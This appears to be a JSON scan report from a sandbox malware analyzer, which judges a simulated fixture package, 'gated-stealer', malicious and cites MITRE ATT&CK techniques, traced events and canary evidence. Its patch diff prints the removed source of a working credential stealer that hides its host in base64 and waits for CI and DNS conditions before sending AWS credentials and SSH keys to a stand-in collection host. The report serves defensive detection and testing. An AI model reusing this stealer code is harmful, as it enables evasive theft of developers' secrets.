@@ -1,0 +1,660 @@
+{
+  "job": "93fe2b7fb9",
+  "target": "D:\\createos-stripe-hackathon\\fixtures\\gated-stealer",
+  "target_kind": "package",
+  "sha256": "f5ea025f79988eb7ff82d8e388c731380986c7856541d31073724e28533b2f49",
+  "created_at": "2026-10-20T09:31:57+00:00",
+  "verdict": "malicious",
+  "score": 100,
+  "confidence": "high",
+  "findings": [
+    {
+      "id": "outbound",
+      "title": "Outbound network attempt to non-registry host",
+      "severity": "medium",
+      "proof": "signal",
+      "attack": [
+        {
+          "id": "T1071.001",
+          "name": "Web Protocols",
+          "url": "https://attack.mitre.org/techniques/T1071/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 0,
+          "event_index": 1,
+          "excerpt": "dns_query:telemetry.cdn-metrics.example"
+        }
+      ]
+    },
+    {
+      "id": "canary_exfil",
+      "title": "Canary credentials exfiltrated",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel",
+          "url": "https://attack.mitre.org/techniques/T1041/"
+        },
+        {
+          "id": "T1552.001",
+          "name": "Credentials In Files",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        },
+        {
+          "id": "T1552.004",
+          "name": "Private Keys",
+          "url": "https://attack.mitre.org/techniques/T1552/004/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 5,
+          "excerpt": "sink_request:telemetry.cdn-metrics.example canaries=AKIASNDTRP5eaf2977,SNDTRP-5eaf2977-AWS,SNDTRP-5eaf2977-SSH"
+        }
+      ]
+    },
+    {
+      "id": "cred_read_outbound",
+      "title": "Credential file read followed by outbound attempt",
+      "severity": "high",
+      "proof": "intent",
+      "attack": [
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel",
+          "url": "https://attack.mitre.org/techniques/T1041/"
+        },
+        {
+          "id": "T1552.001",
+          "name": "Credentials In Files",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        },
+        {
+          "id": "T1552.004",
+          "name": "Private Keys",
+          "url": "https://attack.mitre.org/techniques/T1552/004/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 0,
+          "excerpt": "file_read_sensitive:/root/.aws/credentials"
+        },
+        {
+          "round": 1,
+          "event_index": 1,
+          "excerpt": "file_read_sensitive:/root/.ssh/id_rsa"
+        },
+        {
+          "round": 1,
+          "event_index": 2,
+          "excerpt": "dns_query:telemetry.cdn-metrics.example"
+        },
+        {
+          "round": 1,
+          "event_index": 3,
+          "excerpt": "dns_query:telemetry.cdn-metrics.example"
+        },
+        {
+          "round": 1,
+          "event_index": 4,
+          "excerpt": "dns_query:telemetry.cdn-metrics.example"
+        },
+        {
+          "round": 1,
+          "event_index": 5,
+          "excerpt": "sink_request:telemetry.cdn-metrics.example canaries=AKIASNDTRP5eaf2977,SNDTRP-5eaf2977-AWS,SNDTRP-5eaf2977-SSH"
+        }
+      ]
+    },
+    {
+      "id": "lure_only",
+      "title": "Behaviour only appears under lure (sandbox evasion)",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1497",
+          "name": "Virtualization/Sandbox Evasion",
+          "url": "https://attack.mitre.org/techniques/T1497/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 0,
+          "excerpt": "file_read_sensitive:/root/.aws/credentials"
+        },
+        {
+          "round": 1,
+          "event_index": 1,
+          "excerpt": "file_read_sensitive:/root/.ssh/id_rsa"
+        },
+        {
+          "round": 1,
+          "event_index": 5,
+          "excerpt": "sink_request:telemetry.cdn-metrics.example canaries=AKIASNDTRP5eaf2977,SNDTRP-5eaf2977-AWS,SNDTRP-5eaf2977-SSH"
+        }
+      ]
+    }
+  ],
+  "static_findings": [],
+  "rounds": [
+    {
+      "probe": {
+        "round": -1,
+        "label": "install",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "Processing ./root/work/pkg\n  Installing build dependencies: started\n  Installing build dependencies: finished with status 'done'\n  Getting requirements to build wheel: started\n  Getting requirements to build wheel: finished with status 'done'\n  Preparing metadata (pyproject.toml): started\n  Preparing metadata (pyproject.toml): finished with status 'done'\nBuilding wheels for collected packages: gated-stealer\n  Building wheel for gated-stealer (pyproject.toml): started\n  Building wheel for gated-stealer (pyproject.toml): finished with status 'done'\n  Created wheel for gated-stealer: filename=gated_stealer-0.1.0-py3-none-any.whl size=2057 sha256=a227ee5fddc023eba735425e3143295a3848af51e9ec716b34ab465e45c0180c\n  Stored in directory: /tmp/pip-ephem-wheel-cache-moavb22i/wheels/13/25/4d/8bd974f2a5e81e37fcc7c028cb3bf8fa1d4ca10e8b1484c5b0\nSuccessfully built gated-stealer\nInstalling collected packages: gated-stealer\nSuccessfully installed gated-stealer-0.1.0\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.358,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.359,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/usr/local/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.362,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "asdf",
+              "exec",
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.37,
+          "pid": 659,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env",
+              "-0"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.378,
+          "pid": 654,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.416,
+          "pid": 662,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/__pip-runner__.py",
+              "install",
+              "--ignore-installed",
+              "--no-user",
+              "--prefix",
+              "/tmp/pip-build-env-5wdjrval/overlay",
+              "--no-warn-script-location",
+              "--disable-pip-version-check",
+              "--no-compile",
+              "--target",
+              ""
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.769,
+          "pid": 664,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "uname",
+              "-rs"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.777,
+          "pid": 665,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.779,
+          "pid": 665,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/usr/local/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.781,
+          "pid": 665,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "asdf",
+              "exec",
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.79,
+          "pid": 671,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env",
+              "-0"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.791,
+          "pid": 665,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/.asdf/installs/rust/1.83.0/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.797,
+          "pid": 665,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 1.42,
+          "pid": 675,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "get_requires_for_build_wheel",
+              "/tmp/tmpv5catd3f"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 1.82,
+          "pid": 676,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "prepare_metadata_for_build_wheel",
+              "/tmp/tmpzw31b2mw"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 2.06,
+          "pid": 677,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "build_wheel",
+              "/tmp/tmp7vrzy2qs"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        }
+      ],
+      "duration_ms": 0,
+      "sandbox_id": "sb-01m5caaejxj0ax33x0bygqtr6n",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 0,
+        "label": "baseline",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import importlib, sys, traceback\nfor name in ['gatedstealer']:\n    try:\n        importlib.import_module(name)\n        print('imported', name)\n    except Exception:\n        print('import-error', name); traceback.print_exc()\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "imported gatedstealer\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.111,
+          "pid": 0,
+          "kind": "gate_exit",
+          "data": {
+            "reason": "exited 0 after 0.1s with no observable behaviour"
+          },
+          "round": 0
+        },
+        {
+          "t": 0.169,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry.cdn-metrics.example",
+            "answered": false
+          },
+          "round": 0
+        }
+      ],
+      "duration_ms": 1417,
+      "sandbox_id": "sb-01m5caaejxj0ax33x0bygqtr6n",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 1,
+        "label": "probe-1",
+        "env": {
+          "CI": "1"
+        },
+        "lure": true,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import importlib, sys, traceback\nfor name in ['gatedstealer']:\n    try:\n        importlib.import_module(name)\n        print('imported', name)\n    except Exception:\n        print('import-error', name); traceback.print_exc()\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "imported gatedstealer\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.076,
+          "pid": 732,
+          "kind": "file_read_sensitive",
+          "data": {
+            "path": "/root/.aws/credentials",
+            "canary": "AWS"
+          },
+          "round": 1
+        },
+        {
+          "t": 0.076,
+          "pid": 732,
+          "kind": "file_read_sensitive",
+          "data": {
+            "path": "/root/.ssh/id_rsa",
+            "canary": "SSH"
+          },
+          "round": 1
+        },
+        {
+          "t": 0.137,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry.cdn-metrics.example",
+            "answered": true
+          },
+          "round": 1
+        },
+        {
+          "t": 0.159,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry.cdn-metrics.example",
+            "answered": true
+          },
+          "round": 1
+        },
+        {
+          "t": 0.159,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "telemetry.cdn-metrics.example",
+            "answered": false
+          },
+          "round": 1
+        },
+        {
+          "t": 0.16,
+          "pid": 0,
+          "kind": "sink_request",
+          "data": {
+            "host": "telemetry.cdn-metrics.example",
+            "method": "POST",
+            "path": "/collect",
+            "body": "{\"aws\": \"[default]\\naws_access_key_id = AKIASNDTRP5eaf2977\\naws_secret_access_key = SNDTRP-5eaf2977-AWS/fake/secret/not/real\\n\", \"ssh\": \"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nSNDTRP-5eaf2977-SSH\\nQyNTUxOQAAACBzbmR0cnBjYW5hcnlrZXlub3RyZWFsbm90cmVhbG5vdHJlYWwAAAAAAAAA\\n-----END OPENSSH PRIVATE KEY-----\\n\"}",
+            "canaries": [
+              "AKIASNDTRP5eaf2977",
+              "SNDTRP-5eaf2977-AWS",
+              "SNDTRP-5eaf2977-SSH"
+            ],
+            "orig_dst": ""
+          },
+          "round": 1
+        }
+      ],
+      "duration_ms": 1403,
+      "sandbox_id": "sb-01m5caaejxj0ax33x0bygqtr6n",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 2,
+        "label": "verify-patch-1",
+        "env": {
+          "CI": "1"
+        },
+        "lure": true,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import importlib, sys, traceback\nfor name in ['gatedstealer']:\n    try:\n        importlib.import_module(name)\n        print('imported', name)\n    except Exception:\n        print('import-error', name); traceback.print_exc()\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "imported gatedstealer\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.042,
+          "pid": 0,
+          "kind": "gate_exit",
+          "data": {
+            "reason": "exited 0 after 0.0s with no observable behaviour"
+          },
+          "round": 2
+        }
+      ],
+      "duration_ms": 1372,
+      "sandbox_id": "sb-01m5caaejxj0ax33x0bygqtr6n",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 3,
+        "label": "smoke-test-1",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import gatedstealer\nprint(\"gatedstealer imported successfully with no side effects\")\n",
+        "timeout_s": 30
+      },
+      "exit_code": 0,
+      "stdout": "gatedstealer imported successfully with no side effects\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.023,
+          "pid": 0,
+          "kind": "gate_exit",
+          "data": {
+            "reason": "exited 0 after 0.0s with no observable behaviour"
+          },
+          "round": 3
+        }
+      ],
+      "duration_ms": 1358,
+      "sandbox_id": "sb-01m5caaejxj0ax33x0bygqtr6n",
+      "error": ""
+    }
+  ],
+  "baseline_only": [],
+  "lure_only": [
+    "file_read_sensitive:/root/.aws/credentials",
+    "file_read_sensitive:/root/.ssh/id_rsa",
+    "sink_request:telemetry.cdn-metrics.example"
+  ],
+  "hypotheses": [
+    "The package exfiltrates AWS credentials and SSH keys when CI environment variable is set and telemetry.cdn-metrics.example resolves.",
+    "The package is gated by DNS resolution of telemetry.cdn-metrics.example and the presence of the CI environment variable. When both gates are satisfied, it reads AWS credentials and SSH keys and exfiltrates them via HTTP POST to telemetry.cdn-metrics.example/collect."
+  ],
+  "summary": "The gatedstealer package is a credential harvester that targets AWS credentials (~/.aws/credentials) and SSH private keys (~/.ssh/id_rsa). It remains completely silent unless two conditions are met: the domain 'telemetry.cdn-metrics.example' resolves via DNS, and the 'CI' environment variable is set. When both conditions are satisfied, it reads the sensitive files and exfiltrates them via an HTTP POST request to 'http://telemetry.cdn-metrics.example/collect'.",
+  "attempts": [
+    {
+      "round": 0,
+      "label": "baseline",
+      "exit_code": 0,
+      "note": "default import driver"
+    },
+    {
+      "round": 1,
+      "label": "probe-1",
+      "exit_code": 0,
+      "note": "The package exfiltrates AWS credentials and SSH keys when CI environment variable is set and telemetry.cdn-metrics.example resolves."
+    }
+  ],
+  "egress_timeline": [
+    {
+      "phase": "create",
+      "rules": [
+        "pypi.org:443",
+        "files.pythonhosted.org:443",
+        "registry.npmjs.org:443"
+      ],
+      "note": "sandbox sb-01m5caaejxj0ax33x0bygqtr6n"
+    },
+    {
+      "phase": "analysis",
+      "rules": [
+        "192.0.2.1:9"
+      ],
+      "note": "registry access closed; lure runs on loopback only"
+    }
+  ],
+  "patch_diff": "diff -ru pkg/gatedstealer/__init__.py pkg_patched/gatedstealer/__init__.py\n--- pkg/gatedstealer/__init__.py\t2026-10-17 19:47:44.518205200 +0000\n+++ pkg_patched/gatedstealer/__init__.py\t2026-10-20 09:31:52.144532426 +0000\n@@ -1,67 +1 @@\n-# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files\n-# Simulated LURE-GATED credential-exfiltration behaviour (the hero fixture): it only\n-# fires when BOTH gates pass -- the fake C2 host resolves via DNS, and the CI env var\n-# is set. This proves an analyzer can draw out hidden behaviour by offering those\n-# lures across rounds; absent either lure it exits completely silently.\n-import base64\n-import json\n-import os\n-import socket\n-import urllib.request\n-\n-# Lightly obfuscated host name: base64 + a split literal, both trivially reversible\n-# so a human or LLM reviewer can still read it at a glance.\n-_HOST_B64 = base64.b64encode(b\"telemetry.cdn-metrics.example\").decode()\n-\n-\n-def _resolve_host():\n-    return base64.b64decode(_HOST_B64).decode()\n-\n-\n-def _gate_dns(host):\n-    try:\n-        socket.gethostbyname(host)\n-        return True\n-    except OSError:\n-        return False\n-\n-\n-def _gate_ci():\n-    return os.environ.get(\"CI\") is not None\n-\n-\n-def _read_canary(path):\n-    try:\n-        with open(path, \"r\") as f:\n-            return f.read()\n-    except Exception:\n-        return None\n-\n-\n-def _run():\n-    host = _resolve_host()\n-    if not _gate_dns(host):\n-        return  # silent exit: no DNS lure present\n-    if not _gate_ci():\n-        return  # silent exit: no CI lure present\n-\n-    aws_creds = _read_canary(\"/root/.aws/credentials\")\n-    ssh_key = _read_canary(\"/root/.ssh/id_rsa\")\n-\n-    payload = json.dumps({\"aws\": aws_creds, \"ssh\": ssh_key}).encode()\n-    url = \"ht\" + \"tp://\" + host + \"/collect\"\n-\n-    try:\n-        req = urllib.request.Request(\n-            url,\n-            data=payload,\n-            headers={\"Content-Type\": \"application/json\"},\n-            method=\"POST\",\n-        )\n-        with urllib.request.urlopen(req, timeout=3) as resp:\n-            resp.read()\n-    except Exception:\n-        pass\n-\n-\n-_run()\n+# Harmless package\n",
+  "remediation": "Patched 1 file(s). Removed all credential reading, gating logic, and network exfiltration code. The package now has no side effects. Re-running the same lure that caught the original: no canary credentials left the sandbox, no credential files were read, and the smoke test passed.",
+  "capture_method": "strace",
+  "model": "gemini-3.5-flash",
+  "llm_calls": 6,
+  "sandbox_ids": [
+    "sb-01m5caaejxj0ax33x0bygqtr6n"
+  ],
+  "destroyed": true,
+  "limitations": [
+    "Dynamic analysis runs on Linux only; Windows executables are not executed.",
+    "HTTPS request bodies cannot be read without interception: TLS destinations are recorded by SNI only.",
+    "Evasive code that detects tracing or waits longer than the probe timeout may look quiet; such runs are reported as inconclusive, never clean.",
+    "Canary proof covers the credential types we plant (ssh key, aws, npm, .env)."
+  ],
+  "report_url": "",
+  "intel": [
+    "known indicator telemetry.cdn-metrics.example (seen in 7 earlier scans, last verdict malicious)"
+  ],
+  "used_skills": [
+    "dns-and-ci-gated-credential-stealer",
+    "dns-and-ci-gated-stealer"
+  ],
+  "learned_skills": [
+    "dns-and-env-gated-exfiltration"
+  ],
+  "threat_brief": "",
+  "from_cache": false
+}
